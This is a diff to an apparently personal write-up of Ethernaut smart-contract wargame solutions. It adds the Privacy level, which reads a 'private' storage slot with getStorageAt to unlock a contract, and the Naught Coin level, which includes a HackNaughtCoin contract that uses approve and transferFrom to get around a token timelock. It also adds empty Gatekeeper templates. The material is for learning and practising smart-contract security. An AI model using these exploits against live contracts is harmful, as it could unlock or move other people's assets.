@@ -10,10 +10,10 @@
 9. [King](#9-king)
 10. [Re-entrancy](#10-re-entrancy)
 11. [Elevator](#11-elevator)
-12. [Privacy](yet to update)
+12. [Privacy](#12-privacy)
 13. ~[Gatekeeper One]~
 14. ~[Gatekeeper Two]~
-15. [Naught Coin](yet to update)
+15. [Naught Coin](#15-naught-coin)
 16. [Preservation](yet to update)
 17. [Recovery](yet to update)
 18. [MagicNumber](yet to update)
@@ -462,7 +462,7 @@ Whenever a variable is made private in a contract, it is only not accessible by 
 ```
 await web3.eth.getStorageAt(contract.address, 1)
 ```
-1. In the Ethernaut Vault challenge page, type the above script in the browser console. (`getStorageAt` takes the contract address as the first argument and the slot number as the second argument, then returns the data in that slot. Here the `password` is in `slot 1`)
+1. In the Ethernaut Vault challenge page, type the above script in the browser console. (`getStorageAt` takes the contract address as the first argument and the slot number as the second argument, then returns the data in that slot. Here the `password` is in `slot 1`. read about storage layout [here](https://docs.soliditylang.org/en/v0.8.19/internals/layout_in_storage.html#storage-inplace-encoding))
 2. Copy the value of the resulting bytes.
 3. In Remix, get the instance of the Vault contract and call `unlock()` with the copied value.\
 Now the `locked` variable should be `false`.
@@ -672,3 +672,158 @@ contract AttackElevator {
 ##### Takeaway from Ethernaut
 You can use the view function modifier on an interface to prevent state modifications. The pure modifier also prevents functions from modifying the state. Make sure you read [Solidity's documentation](http://solidity.readthedocs.io/en/develop/contracts.html#view-functions) and learn its caveats.\
 An alternative way to solve this level is to build a view function that returns different results depending on input data but doesn't modify the state, e.g. gasleft().
+
+# 12. Privacy
+### Challenge
+- Make the boolean value of `locked` false.
+### Purpose
+Nothing in the Ethereum blockchain is private.
+### Contract
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Privacy {
+
+  bool public locked = true;
+  uint256 public ID = block.timestamp;
+  uint8 private flattening = 10;
+  uint8 private denomination = 255;
+  uint16 private awkwardness = uint16(block.timestamp);
+  bytes32[3] private data;
+
+  constructor(bytes32[3] memory _data) {
+    data = _data;
+  }
+  
+  function unlock(bytes16 _key) public {
+    require(_key == bytes16(data[2]));
+    locked = false;
+  }
+
+  // A bunch of super-advanced solidity algorithms...
+}
+```
+### Solution
+##### Explanation
+This is similar to Vault Challenge. First, we need to find the storage slot of the second index of the `data` variable since that is the value needed to unlock. By [storage layout](https://docs.soliditylang.org/en/v0.8.19/internals/layout_in_storage.html#storage-inplace-encoding) of solidity, the slot is **5**. Again I am using injected Web3 provider available in the browser to get the bytes data in that slot and slice them to the first 16 bytes to clear the check condition.
+##### Exploit
+```
+data = await web3.eth.getStorageAt(contract.address, 5)
+data.slice(0, 2 + 16 * 2)
+```
+1. Paste the above script into the browser console. (we need the first 16 bytes which is the first 32 characters in the hex plus "0x" prefix, so in total first 34 char of data).
+2. Copy the Hex values from the console.
+3. Call `unlock()` with the copied value.\
+Now the `locked` value should be false.
+##### Takeaway from Ethernaut
+The keyword private is merely an artificial construct of the Solidity language. Web3's `getStorageAt(...)` can be used to read anything from storage. It can be tricky to read what you want though, since several optimization rules and techniques are used to compact the storage as much as possible.\
+It can't get much more complicated than what was exposed in this level. For more, check out this excellent article by "Darius": [How to read Ethereum contract storage](https://medium.com/aigang-network/how-to-read-ethereum-contract-storage-44252c8af925)
+
+# 13. Gatekeeper One
+### Challenge
+- 
+### Purpose
+
+### Contract
+```
+
+```
+### Solution
+##### Explanation
+
+##### Exploit
+```
+
+```
+##### Takeaway from Ethernaut
+
+# 14. Gatekeeper Two
+### Challenge
+- 
+### Purpose
+
+### Contract
+```
+
+```
+### Solution
+##### Explanation
+
+##### Exploit
+```
+
+```
+##### Takeaway from Ethernaut
+
+# 15. Naught Coin
+### Challenge
+- To bring our token balance to 0.
+### Purpose
+Understand the ERC20 token standard.
+### Contract
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+
+ contract NaughtCoin is ERC20 {
+
+  // string public constant name = 'NaughtCoin';
+  // string public constant symbol = '0x0';
+  // uint public constant decimals = 18;
+  uint public timeLock = block.timestamp + 10 * 365 days;
+  uint256 public INITIAL_SUPPLY;
+  address public player;
+
+  constructor(address _player) 
+  ERC20('NaughtCoin', '0x0') {
+    player = _player;
+    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
+    // _totalSupply = INITIAL_SUPPLY;
+    // _balances[player] = INITIAL_SUPPLY;
+    _mint(player, INITIAL_SUPPLY);
+    emit Transfer(address(0), player, INITIAL_SUPPLY);
+  }
+  
+  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
+    super.transfer(_to, _value);
+  }
+
+  // Prevent the initial owner from transferring tokens until the timelock has passed
+  modifier lockTokens() {
+    if (msg.sender == player) {
+      require(block.timestamp > timeLock);
+      _;
+    } else {
+     _;
+    }
+  } 
+} 
+```
+### Solution
+##### Explanation
+This is challenge is to understand [ERC20 Token Standard](https://eips.ethereum.org/EIPS/eip-20) (this [resource](https://docs.openzeppelin.com/contracts/4.x/api/token/erc20) helps to understand openzeppelin ERC20 implementation).\
+We cannot use `transfer` because of the timelock. But we can allow a contract to transfer our tokens using the `approve` and `transferFrom` functions of ERC20. We need to create a contract and approve it to transfer all the tokens in our balance.
+##### Exploit
+```
+contract HackNaughtCoin {
+    NaughtCoin public immutable target;
+
+    constructor(NaughtCoin _target) {
+        target = _target;
+    }
+    function attack() external {
+        uint balance = target.balanceOf(msg.sender);
+        target.transferFrom(msg.sender, address(this), balance);
+    }
+}
+```
+1. Get the instance of `NaughtCoin` in Remix and get the balance of tokens in our address which is the token amount for allowance.
+2. Deploy the above contract and get the address of it.
+3. Call the `approve` function in `NaughtCoin` with the `HackNaughtCoin` contract address and token amount as arguments.
+4. Call `attack()` in `HackNaughtCoin` to transfer all the tokens to itself.\
+Now the balance of tokens we hold is **0**.
+##### Takeaway from Ethernaut
+When using code that's not your own, it's a good idea to familiarize yourself with it to get a good understanding of how everything fits together. This can be particularly important when there are multiple levels of imports (your imports have imports) or when you are implementing authorization controls, e.g. when you're allowing or disallowing people from doing things. In this example, a developer might scan through the code and think that `transfer` is the only way to move tokens around, low and behold there are other ways of performing the same operation with a different implementation.
